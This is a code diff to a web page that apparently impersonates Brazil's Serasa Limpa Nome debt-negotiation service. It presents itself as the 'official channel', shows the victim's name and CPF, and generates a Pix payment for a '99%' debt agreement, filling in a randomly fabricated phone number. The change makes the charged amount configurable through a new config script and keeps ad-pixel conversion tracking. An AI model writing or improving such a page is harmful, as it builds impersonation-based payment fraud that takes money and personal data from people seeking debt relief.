@@ -101,6 +101,7 @@ footer small{color:#ffd1e8;font-size:11px}
   </div>
 </div>
 <footer><div class="g2">Serasa Limpa Nome</div><small>Canal oficial de negociação · Seus dados estão protegidos.</small></footer>
+<script src="../js/config.js?v=4"></script>
 <script src="../js/track.js"></script>
 <script>
 var data={};try{data=JSON.parse(localStorage.getItem('sr_consulta')||'{}');}catch(e){}
@@ -113,8 +114,9 @@ document.getElementById('r-cpf').textContent=cpf;
 document.getElementById('c-nome').textContent=full;
 document.getElementById('c-cpf').textContent=cpf;
 function randPhone(){var ddd=('0'+(Math.floor(Math.random()*89)+11)).slice(-2);var n='9';for(var i=0;i<8;i++){n+=Math.floor(Math.random()*10);}return ddd+n;}
+var acordoValor=(window.SR_CONFIG&&window.SR_CONFIG.getAcordoAmount)?window.SR_CONFIG.getAcordoAmount(false):66.38;
 document.getElementById('btn-pix').onclick=async function(){
-  try{if(window.fbq)fbq('track','InitiateCheckout',{value:66.38,currency:'BRL'});}catch(e){}
+  try{if(window.fbq)fbq('track','InitiateCheckout',{value:acordoValor,currency:'BRL'});}catch(e){}
   var btn=this,err=document.getElementById('pix-err');
   err.classList.remove('show');
   var digits=(''+cpf).replace(/\D/g,'');
@@ -124,7 +126,7 @@ document.getElementById('btn-pix').onclick=async function(){
     var phone=randPhone();
     var body={
       identifier:identifier,
-      amount:66.38,
+      amount:acordoValor,
       productType:'acordo',
       productName:'Acordo Serasa 99%',
       client:{name:full,document:digits,phone:phone},
@@ -138,7 +140,7 @@ document.getElementById('btn-pix').onclick=async function(){
     localStorage.setItem('sr_pix',JSON.stringify({
       id:(j.transactionId||j.id),
       payload:code,
-      total:(j.amount||j.total_value||66.38),
+      total:(j.amount||j.total_value||acordoValor),
       createdAt:_created,
       image:(j.pix&&j.pix.image),
       base64:(j.pix&&j.pix.base64),
